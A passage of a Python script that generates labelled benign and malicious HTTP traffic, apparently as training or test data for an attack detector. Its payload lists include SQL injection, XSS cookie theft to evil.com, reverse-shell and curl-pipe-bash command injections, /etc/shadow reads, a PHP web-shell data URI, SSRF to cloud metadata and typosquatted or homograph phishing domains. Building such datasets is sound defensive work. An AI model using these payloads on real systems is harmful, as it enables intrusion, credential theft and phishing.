            cookie_value = generate_malicious_cookie_payload(attack_type)
        else:
            cookie_value = "GA_analytics_id"
        cookies["_ga"] = cookie_value
    
    if random.random() < cookie_types['preferences']:
        if is_malicious:
            cookie_value = generate_malicious_cookie_payload(attack_type)
        else:
            lang = random.choice(supported_languages)
            region = random.choice(list(domain_weights.keys())).upper()
            cookie_value = f"lang:{lang},region:{region}"
        cookies["preferences"] = cookie_value
    
    if random.random() < cookie_types['auth']:
        if is_malicious:
            cookie_value = generate_malicious_cookie_payload(attack_type)
        else:
            cookie_value = "auth_token"
        cookies["auth_token"] = cookie_value
    
    if random.random() < cookie_types['theme']:
        if is_malicious:
            cookie_value = generate_malicious_cookie_payload(attack_type)
        else:
            cookie_value = random.choice(["light", "dark", "system"])
        cookies["theme"] = cookie_value
    
    if random.random() < cookie_types['language']:
        if is_malicious:
            cookie_value = generate_malicious_cookie_payload(attack_type)
        else:
            cookie_value = random.choice(supported_languages)
        cookies["lang"] = cookie_value
    
    if random.random() < cookie_types['region']:
        if is_malicious:
            cookie_value = generate_malicious_cookie_payload(attack_type)
        else:
            cookie_value = random.choice(list(domain_weights.keys())).upper()
        cookies["region"] = cookie_value
    
    return cookies

def get_domain_components(url):
    """Extract domain components from a URL"""
    parsed = urlparse(url)
    domain = parsed.netloc
    if not domain:
        # Try to parse a URL without scheme
        if '/' in url:
            domain = url.split('/', 1)[0]
        else:
            domain = url
    
    # Remove www. prefix if present
    if domain.startswith('www.'):
        domain = domain[4:]
    
    path = parsed.path
    if not path:
        if '/' in url and not url.endswith(domain):
            path = '/' + url.split('/', 1)[1]
        else:
            # Ensure we always have a path
            path = '/'
    
    # Ensure path starts with /
    if not path.startswith('/'):
        path = '/' + path
    
    scheme = parsed.scheme or ('https' if not is_malicious_domain(domain) else 'http')
    
    return scheme, domain, path

def is_malicious_domain(domain):
    """Helper function to check if a domain is in the malicious list"""
    return any(domain in mal_domain for mal_domain in malicious_domains)

def generate_request_method(is_malicious=False):
    """Generate HTTP method with appropriate weights"""
    if is_malicious:
        return random.choices(
            ["GET", "POST", "PUT", "DELETE", "OPTIONS", "HEAD", "PATCH", "TRACE", "CONNECT"],
            weights=[40, 35, 10, 5, 3, 2, 2, 2, 1]
        )[0]
    else:
        return random.choices(
            ["GET", "POST", "PUT", "DELETE", "HEAD"],
            weights=[70, 20, 5, 3, 2]
        )[0]

def generate_international_domain(is_malicious=False):
    """Generate domain names with international variations"""
    if is_malicious:
        # For malicious domains, either use from list or create deceptive variations
        if malicious_domains and random.random() < 0.7:  # 70% chance to use existing malicious domain
            return random.choice(malicious_domains)
        
        # Otherwise create a deceptive domain based on a legitimate one
        real_domain = random.choice([domain for domains in international_domains.values() for domain in domains])
        domain_parts = real_domain.split('.')
        
        # Weights for different types of malicious domains
        malicious_types = {
            'typo': 0.35,        # Typosquatting (highest weight)
            'homograph': 0.20,   # Homograph attacks
            'subdomain': 0.15,   # Malicious subdomains
            'tld': 0.15,         # TLD variation
            'keyword': 0.10,     # Obviously malicious
            'prefix': 0.05       # Prefix/suffix tricks
        }
        
        attack_type = random.choices(list(malicious_types.keys()), 
                                   weights=list(malicious_types.values()))[0]
        
        # Generate malicious domain based on attack type
        if attack_type == 'typo':
            typo_variations = [
                domain_parts[0].replace('o', '0'),
                domain_parts[0].replace('i', '1'),
                domain_parts[0].replace('l', '1'),
                domain_parts[0].replace('e', '3'),
                domain_parts[0].replace('a', '4'),
                domain_parts[0].replace('s', '5'),
                domain_parts[0].replace('w', 'vv'),
                f"{domain_parts[0]}s",
                f"{domain_parts[0][:-1]}",
                f"{domain_parts[0][1:]}",
                ''.join([b+a for a, b in zip(domain_parts[0][1:], domain_parts[0][:-1])]) if len(domain_parts[0]) > 1 else domain_parts[0]
            ]
            return f"{random.choice(typo_variations)}.{domain_parts[-1]}"
        
        elif attack_type == 'homograph':
            # Homograph attack variations (using similar-looking characters)
            homograph_chars = {
                'a': ['а', 'ɑ'],  # Cyrillic 'а'
                'e': ['е', 'ē'],  # Cyrillic 'е'
                'i': ['і', 'ı'],  # Cyrillic 'і'
                'o': ['о', 'ο'],  # Cyrillic 'о'
                'c': ['с', 'ϲ'],  # Cyrillic 'с'
                'p': ['р', 'ρ'],  # Cyrillic 'р'
                'y': ['у', 'ү']   # Cyrillic 'у'
            }
            domain_name = domain_parts[0]
            for char in homograph_chars:
                if char in domain_name and random.random() < 0.3:  # 30% chance to replace each eligible character
                    domain_name = domain_name.replace(char, random.choice(homograph_chars[char]))
            return f"{domain_name}.{domain_parts[-1]}"
            
        elif attack_type == 'subdomain':
            # Subdomain tricks
            legitimate_words = ['secure', 'login', 'account', 'verify', 'auth', 'api', 'app', 'portal', 'web']
            subdomain = random.choice(legitimate_words)
            return f"{subdomain}.{domain_parts[0]}.{domain_parts[-1]}"
            
        elif attack_type == 'tld':
            # TLD variation
            similar_tlds = {
                'com': ['cm', 'co', 'con', 'com.ru', 'com.cn', 'com.br'],
                'org': ['ogr', 'or', 'org.cn', 'org.ru'],
                'net': ['nt', 'net.ru', 'net.cn'],
                'edu': ['ed', 'edu.cn', 'edu.ru'],
                'gov': ['gv', 'gov.cn', 'gov.ru']
            }
            original_tld = domain_parts[-1]
            if original_tld in similar_tlds:
                new_tld = random.choice(similar_tlds[original_tld])
            else:
                new_tld = random.choice(['com', 'net', 'org', 'info', 'biz'])
            return f"{domain_parts[0]}.{new_tld}"
            
        elif attack_type == 'keyword':
            # Obviously malicious domains (reduced frequency)
            malicious_words = ['evil', 'hack', 'malware', 'phish']  # Reduced list
            return f"{random.choice(malicious_words)}-{domain_parts[0]}.{domain_parts[-1]}"
            
        else:  # prefix
            # Prefix/Suffix tricks
            prefixes = ['secure-', 'my-', 'login-', 'signin-', 'auth-']
            return f"{random.choice(prefixes)}{domain_parts[0]}.{domain_parts[-1]}"
            
    else:
        # For benign domains, use proper weighting for international distribution
        if benign_domains and random.random() < 0.7:  # 70% chance to use existing benign domain
            return random.choice(benign_domains)
        
        # Otherwise generate a new benign domain with proper regional distribution
        weights = {
            'in': 15,    # India
            'cn': 15,    # China
            'jp': 12,    # Japan
            'kr': 12,    # South Korea
            'sea': 12,   # Southeast Asia
            'de': 8,     # Germany
            'fr': 8,     # France
            'ru': 10,    # Russia
            'me': 10,    # Middle East
            'latam': 12, # Latin America
            'af': 10,    # Africa
            'global': 8  # Global/US (reduced weight)
        }
        
        # Select region based on weights
        region = random.choices(list(weights.keys()), weights=list(weights.values()))[0]
        
        # Ensure the region exists in international_domains
        if region in international_domains and international_domains[region]:
            return random.choice(international_domains[region])
        else:
            # Fallback to global domains if region is not found
            return random.choice(international_domains['global'])

def generate_malicious_password(attack_type):
    """Generate malicious passwords based on attack type"""
    if attack_type == "SQL Injection":
        return random.choice([
            "' OR '1'='1",
            "admin'--",
            "' UNION SELECT password,username FROM users--",
            "' OR username LIKE '%admin%",
            "')) OR EXISTS(SELECT * FROM users WHERE username='admin'--",
            "' OR '1'='1' LIMIT 1--",
            "admin' AND LENGTH(password)>8--",
            "' OR username='admin' AND password LIKE 'a%",
            "' UNION ALL SELECT NULL,NULL,NULL,NULL--",
            "admin'); DROP TABLE users--",
            # International variations
            "' OR 用户名='管理员'--",  # Chinese
            "' OR ユーザー='管理者'--",  # Japanese
            "' OR उपयोगकर्ता='एडमिन'--",  # Hindi
            "' OR пользователь='админ'--",  # Russian
            "' OR 사용자='관리자'--"  # Korean
        ])
    elif attack_type == "XSS":
        return random.choice([
            "<script>alert(1)</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert(document.cookie)>",
            "javascript:alert(document.domain)",
            "<script>fetch('http://evil.com/'+document.cookie)</script>",
            "'-alert(1)-'",
            "<script>new Image().src='http://evil.com/'+document.cookie</script>",
            "<body onload=alert('XSS')>",
            "<img src='x' onerror='eval(atob(\"YWxlcnQoJ1hTUycp\"))'>",
            # International variations
            "<script>alert('漏洞')</script>",  # Chinese
            "<script>alert('脆弱性')</script>",  # Japanese
            "<script>alert('취약점')</script>",  # Korean
            "<script>alert('уязвимость')</script>",  # Russian
            "<script>alert('भेद्यता')</script>"  # Hindi
        ])
    elif attack_type == "Command Injection":
        return random.choice([
            "admin' && cat /etc/passwd",
            "pass' ; ls -la",
            "' | nc attacker.com 4444",
            "; curl http://evil.com/shell.sh | bash",
            "admin' && echo $PATH",
            "' || wget http://evil.com/backdoor",
            "pass' ; id #",
            "`whoami`",
            "$(cat /etc/shadow)",
            "admin' ; bash -i >& /dev/tcp/evil.com/4444 0>&1",
            # International variations
            "' && dir",  # Windows
            "' ; type config.* #",  # Windows
            "' && systeminfo",  # Windows
            "' ; net user",  # Windows
            "' && ipconfig /all"  # Windows
        ])
    else:
        return f"malicious_password_{random.randint(1000, 9999)}"

def generate_url_attack_payload(attack_type):
    """Generate URL-based attack payloads"""
    if attack_type == "sqli":
        patterns = [
            # Basic authentication bypass
            "?id=1' OR '1'='1",
            "?user=admin'--",
            "?uid=-1' OR 'a'='a",
            
            # Data extraction
            "?category=1 UNION SELECT username,password FROM users--",
            "?item=1' UNION SELECT table_name,NULL FROM information_schema.tables--",
            "?product=1' AND 1=CONVERT(int,(SELECT @@version))--",
            
            # Blind SQL injection
            "?page=1' AND (SELECT COUNT(*) FROM users)>0--",
            "?id=1' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE id=1)>50--",
            "?uid=1' AND IF(1=1,SLEEP(0),0)--",
            
            # Error-based SQL injection
            "?id=1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
            "?item=1' AND extractvalue(1,concat(0x7e,database(),0x7e))--",
            "?pid=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",
            
            # Stacked queries
            "?id=1'; INSERT INTO users VALUES ('evil','pass')--",
            "?uid=1'; DROP TABLE users--",
            "?pid=1'; EXEC xp_cmdshell('net user')--",
            
            # Time-based blind
            "?id=1' AND (SELECT * FROM (SELECT(SLEEP(0)))a)--",
            "?uid=1' WAITFOR DELAY '0:0:0'--",
            "?pid=1' AND SLEEP(IF(ASCII(SUBSTRING(database(),1,1))=100,0,0))--",
            
            # Advanced techniques
            "?id=1' AND JSON_EXTRACTVALUE(1,CONCAT('$',VERSION()))--",
            "?item=1' AND GTID_SUBSET(CONCAT(0x7e,VERSION(),0x7e),0)--",
            "?product=1' AND POLYGON((SELECT * FROM (SELECT * FROM users)x))--"
        ]
    elif attack_type == "xss":
        patterns = [
            # Basic XSS
            "?q=<script>alert(1)</script>",
            "?search=<img src=x onerror=alert('XSS')>",
            "?input=<svg/onload=alert(document.cookie)>",
            
            # DOM-based XSS
            "?data=javascript:alert(document.domain)",
            "?redirect=javascript:eval(atob('YWxlcnQoMSk='))",
            "?url=data:text/html,<script>alert(1)</script>",
            
            # Event handlers
            "?name=<img src=x onmouseover=alert(1)>",
            "?text=<body onload=alert(document.cookie)>",
            "?input=<svg onload=eval(atob('YWxlcnQoMSk='))>",
            
            # Template literals
            "?q=<script>alert`1`</script>",
            "?search=<img src=x onerror=eval`alert\u0028document.domain\u0029`>",
            "?data=<x onclick=Function`alert\u0028document.cookie\u0029```>",
            
            # Modern techniques
            "?input=<script>fetch(`//evil.com`,{method:`POST`,body:document.cookie})</script>",
            "?q=<img src=x onerror=import('//evil.com/x.js')>",
            "?search=<style>@keyframes x{}</style><xss style='animation-name:x' onanimationend='alert(1)'>",
            
            # Polyglot XSS
            "?data=javascript:'><script>alert(1)</script>",
            "?input=jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>>",
            "?q='\"><svg/onload=alert(1)>{{7*7}}"
        ]
    elif attack_type == "path_traversal":
        patterns = [
            # Basic directory traversal
            "?file=../../../etc/passwd",
            "?path=..%2F..%2F..%2Fetc%2Fshadow",
            "?doc=....//....//....//etc/hosts",
            
            # Encoded traversal
            "?template=..%c0%af..%c0%af..%c0%afetc/passwd",
            "?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "?path=..%252f..%252f..%252fetc%252fpasswd",
            
            # Double encoding
            "?document=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            "?file=%25252e%25252e%25252f%25252e%25252e%25252fetc%25252fpasswd",
            
            # Unicode encoding
            "?path=..%u2215..%u2215etc%u2215passwd",
            "?file=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            
            # Mixed encoding
            "?doc=....%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "?template=..%2f....//....%2f%2e%2e%2fetc%2fpasswd",
            
            # Windows specific
            "?file=..%5c..%5c..%5cwindows%5cwin.ini",
            "?path=..%5c..%5c..%5csystem32%5cconfig%5csystem",
            
            # Nested traversal
            "?document=....//....//....//....//etc/passwd",
            "?file=..//..//../..//etc//passwd",
            
            # Protocol wrapper
            "?path=file:///etc/passwd",
            "?doc=file:///../../../etc/passwd"
        ]
    elif attack_type == "lfi":
        patterns = [
            # PHP wrappers
            "?file=php://filter/convert.base64-encode/resource=index.php",
            "?path=php://filter/read=string.rot13/resource=config.php",
            "?include=php://input",
            "?doc=phar://archive.phar/file.txt",
            
            # Data wrappers
            "?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4=",
            "?path=data://text/plain,%3C?php%20system($_GET[%27cmd%27]);%20?%3E",
            
            # Compression wrappers
            "?include=compress.zlib://file.txt",
            "?doc=compress.bzip2://file.txt",
            
            # Advanced techniques
            "?file=zip://upload.zip%23file.php",
            "?path=rar://archive.rar%23file.php",
            "?include=glob://../../**/config.php",
            
            # Protocol abuse
            "?doc=file:///proc/self/environ",
            "?file=file:///proc/self/cmdline",
            "?path=file:///proc/self/fd/9",
            
            # Session inclusion
            "?include=/var/lib/php/sessions/sess_SESSIONID",
            "?file=/tmp/sess_SESSIONID",
            
            # Log inclusion
            "?path=/var/log/apache2/access.log",
            "?doc=/var/log/nginx/access.log",
            "?include=/var/log/mail.log"
        ]
    elif attack_type == "open_redirect":
        patterns = [
            # Basic redirects
            "?redirect=//evil.com",
            "?url=https://attacker.com",
            "?next=//malicious.org",
            
            # Encoded redirects
            "?return=%2F%2Fevil.com",
            "?redirect=%2F%2Fattacker.com%2Fmalicious",
            "?url=%2F%2Fmalicious.org%2Fphishing",
            
            # Double encoded
            "?next=%252F%252Fevil.com",
            "?redirect=%252F%252Fattacker.com",
            
            # Protocol relative
            "?url=////evil.com",
            "?return=/\\/\\/attacker.com",
            
            # Advanced techniques
            "?redirect=javascript://evil.com%0aalert(1)",
            "?url=data://text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            "?next=vbscript:alert(1)",
            
            # Domain confusion
            "?redirect=https://legitimate.com@evil.com",
            "?url=https://evil.com%2F.legitimate.com",
            "?next=https://legitimate.com.evil.com",
            
            # Parameter pollution
            "?redirect=legitimate.com&redirect=evil.com",
            "?url=https://legitimate.com&url=https://evil.com",
            
            # Unicode confusion
            "?return=https://evil.com%E3%80%82legitimate.com",
            "?redirect=//evil.com%E3%80%82legitimate.com"
        ]
    elif attack_type == "ssrf":
        patterns = [
            # Basic SSRF
            "?url=http://localhost:8080/admin",
            "?proxy=http://127.0.0.1/secret",
            "?fetch=http://internal-service/api",
            
            # Cloud metadata
            "?url=http://169.254.169.254/latest/meta-data/",
            "?proxy=http://metadata.google.internal/computeMetadata/v1/",
            "?fetch=http://169.254.169.254/metadata/v1/",
            
            # Alternative IP forms
            "?url=http://0177.0.0.1/",
            "?proxy=http://0x7f.0x0.0x0.0x1/",
            "?fetch=http://2130706433/",  # Decimal representation
            
            # IPv6 variations
            "?url=http://[::1]:8080/",
            "?proxy=http://[::]:80/",
            "?fetch=http://[0:0:0:0:0:ffff:127.0.0.1]/",
            
            # Protocol abuse
            "?url=gopher://127.0.0.1:6379/_SET%20mykey%20%22myvalue%22",
            "?proxy=dict://127.0.0.1:11211/stats",
            "?fetch=file:///etc/passwd",
            
            # DNS rebinding
            "?url=http://spoofed.burpcollaborator.net",
            "?proxy=http://dynamic.dns.rebind.it",
            
            # Advanced techniques
            "?url=http://localhost%2523@public.com",
            "?proxy=http://127.0.0.1%2523@public.com",
            "?fetch=http://127.1/",
            
            # Chained exploits
            "?url=jar:http://127.0.0.1:8080!/index.php",
            "?proxy=ftp://127.0.0.1:21",
            "?fetch=ldap://127.0.0.1:389"
        ]
    else:
        # Generic parameter attacks
        patterns = [
            "?debug=true",
            "?test=1",
            "?admin=1",
            "?show=all",
            "?view=raw"
        ]
    
    return random.choice(patterns)

def generate_path_with_attack(base_path, attack_type, attack_payload=None):
    """Generate a path with attack payload"""
    if not attack_payload:
        attack_payload = generate_url_attack_payload(attack_type)
    
    # Clean up the base path first
    base_path = simplify_encoded_values(base_path)
    
    # Different path patterns for different attack types
    if attack_type == "Path Traversal":
        # Use the payload directly as path
        return attack_payload.lstrip('?file=').lstrip('?path=')
    elif attack_type == "LFI":
        # Combine with legitimate-looking paths
        paths = [
            f"{base_path}/includes/{attack_payload}",
            f"{base_path}/templates/{attack_payload}",
            f"{base_path}/views/{attack_payload}",
            f"{base_path}/content/{attack_payload}",
            f"{base_path}/files/{attack_payload}"
        ]
        return random.choice(paths)
    elif attack_type == "SQL Injection":
        # Add SQL injection to path parameters
        params = ["id", "category", "product", "user", "item", "page", "section"]
        param = random.choice(params)
        clean_payload = attack_payload.lstrip('?'+param+'=')
        return f"{base_path}?{param}={clean_payload}"
    elif attack_type == "XSS":
        # Add XSS payload to different parameters
        params = ["q", "search", "input", "data", "text", "content"]
        param = random.choice(params)
        clean_payload = attack_payload.lstrip('?'+param+'=')
        return f"{base_path}?{param}={clean_payload}"
    elif attack_type == "Command Injection":
        # Add command injection to command-like parameters
        params = ["cmd", "exec", "run", "command", "action", "task"]
        param = random.choice(params)
        clean_payload = attack_payload.lstrip('?'+param+'=')
        return f"{base_path}?{param}={clean_payload}"
    elif attack_type == "SSRF":
        # Add SSRF payload to URL-related parameters
        params = ["url", "proxy", "file", "path", "fetch", "source"]
        param = random.choice(params)
        clean_payload = attack_payload.lstrip('?'+param+'=')
        return f"{base_path}?{param}={clean_payload}"
    else:
        # Generic parameter attack
        return f"{base_path}{attack_payload}"

def simplify_encoded_values(path):
    """Simplify encoded values in URLs while preserving structure"""
    import re
    
    # Patterns for common encoded formats
    patterns = [
        # Base64 pattern (at least 20 chars of base64 valid chars)
        (r'([A-Za-z0-9+/]{20,}={0,2})', 'random_value'),
        # JWT pattern (two or three base64 parts separated by dots)
        (r'([A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}|[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,})', 'random_value'),
        # Java serialized data pattern
        (r'(rO0[A-Za-z0-9+/]{20,}={0,2})', 'random_value'),
        # Long hex strings
        (r'([0-9a-fA-F]{32,})', 'random_value'),
        # Long numeric strings
        (r'(\d{20,})', 'random_value')
    ]
    
    # Don't modify if it looks like an attack payload
    attack_indicators = ["'", '"', '<', '>', '%', '(', ')', ';', '|', '`']
    if any(indicator in path for indicator in attack_indicators):
        return path
    
    # Apply each pattern
    result = path
    for pattern, replacement in patterns:
        result = re.sub(pattern, replacement, result)
    
    return result

# Add after the domain_weights dictionary

# Common phishing keywords and patterns
phishing_keywords = {
    'action_words': ['login', 'signin', 'verify', 'confirm', 'secure', 'update', 'password', 'recover', 'unlock', 'authenticate'],
    'service_words': ['account', 'profile', 'wallet', 'payment', 'billing', 'security', 'support', 'help', 'service'],
    'urgency_words': ['required', 'important', 'urgent', 'suspended', 'limited', 'blocked', 'restricted'],
    'financial_words': ['bank', 'credit', 'debit', 'payment', 'transfer', 'transaction', 'invest', 'crypto', 'bitcoin'],
    'brand_names': ['paypal', 'amazon', 'apple', 'microsoft', 'google', 'facebook', 'netflix', 'instagram', 'twitter', 'spotify']
}

# Suspicious TLDs commonly used in phishing
suspicious_tlds = [
    'info', 'biz', 'me', 'co', 'edu', 'org', 'net', 'gov',  # Common legitimate but often abused
    'xyz', 'top', 'club', 'online', 'site', 'live', 'click', 'link',  # New gTLDs often abused
    'tk', 'ml', 'ga', 'cf', 'gq',  # Free TLDs often abused
    'ru', 'cn', 'su', 'pw', 'to', 'cc'  # Country TLDs often abused
]

# Add after the attack_types_with_weights dictionary

# URL-based attack types and their weights
url_based_attacks = {
    "phishing": 30,        # Phishing URLs (highest priority)
    "url_spam": 25,        # Spam URLs
    "typosquatting": 15,   # Typosquatting domains
    "scam": 15,           # Scam websites
    "malware": 15         # Malware distribution URLs
}

def generate_malicious_domain(attack_type):
    """Generate malicious domains based on attack type"""
    if attack_type == "url_spam":
        spam_words = ["free", "discount", "win", "prize", "lucky", "bonus", "deal", "offer", "cheap", "buy"]
        spam_suffixes = ["best", "online", "now", "today", "store", "shop", "mall", "mart", "center"]
        domain = f"{random.choice(spam_words)}{random.choice(spam_suffixes)}.{random.choice(suspicious_tlds)}"
    elif attack_type == "typosquatting":
        real_domain = random.choice(benign_domains)
        domain = misspell_word(real_domain)
    elif attack_type == "scam":
        scam_words = ["claim", "verify", "urgent", "account", "secure", "support", "service", "center"]
        brand = random.choice(phishing_keywords['brand_names'])
        domain = f"{random.choice(scam_words)}-{brand}.{random.choice(suspicious_tlds)}"
    elif attack_type == "malware":
        malware_words = ["update", "download", "patch", "fix", "driver", "software", "app", "install"]
        domain = f"{random.choice(malware_words)}-{random.randint(100,999)}.{random.choice(suspicious_tlds)}"
    else:  # Default to phishing-like domain
        return generate_phishing_domain()
    return domain

def generate_malicious_path(attack_type):
    """Generate malicious paths based on attack type"""
    if attack_type == "phishing":
        return generate_phishing_path()
    elif attack_type == "url_spam":
        spam_paths = [
            "/discount", "/offer", "/deal", "/sale", "/promo",
            "/win", "/prize", "/lucky", "/bonus", "/free",
            "/limited-time", "/special-offer", "/exclusive-deal"
        ]
        return random.choice(spam_paths)
    elif attack_type == "scam":
        scam_paths = [
            "/verify-account", "/confirm-identity", "/secure-login",
            "/account-recovery", "/password-reset", "/urgent-action",
            "/security-check", "/account-update", "/verification"
        ]
        return random.choice(scam_paths)
    elif attack_type == "malware":
        malware_paths = [
            "/download", "/update", "/patch", "/setup", "/install",
            "/driver", "/software", "/app", "/plugin", "/extension",
            "/flash-update", "/java-update", "/pdf-reader"
        ]
        return random.choice(malware_paths)
    else:
        return random.choice(web_paths)

def generate_malicious_form_data(attack_type):
    """Generate malicious form data based on attack type"""
    if attack_type == "phishing":
        return generate_phishing_form_data()
    elif attack_type == "url_spam":
        spam_fields = {
            'product': ['discount', 'offer', 'deal', 'price', 'sale'],
            'action': ['buy', 'order', 'purchase', 'get', 'claim'],
            'promo': ['special', 'limited', 'exclusive', 'best', 'today']
        }
        form_data = []
        for category, fields in spam_fields.items():
            form_data.append(f"{category}={random.choice(fields)}")
        return "&".join(form_data)
    elif attack_type == "scam":
        scam_fields = {
            'verify': ['identity', 'account', 'details', 'information'],
            'urgency': ['immediate', 'urgent', 'required', 'important'],
            'action': ['confirm', 'validate', 'verify', 'update']
        }
        form_data = []
        for category, fields in scam_fields.items():
            form_data.append(f"{category}={random.choice(fields)}")
        return "&".join(form_data)
    elif attack_type == "malware":
        malware_fields = {
            'file': ['update.exe', 'patch.zip', 'setup.msi', 'install.dmg'],
            'version': [f"{random.randint(1,10)}.{random.randint(0,9)}.{random.randint(0,9)}"],
            'platform': ['windows', 'mac', 'linux', 'android', 'ios']
        }
        form_data = []
        for category, fields in malware_fields.items():
            form_data.append(f"{category}={random.choice(fields)}")
        return "&".join(form_data)
    else:
        return generate_benign_form_data()

if __name__ == "__main__":
    main()
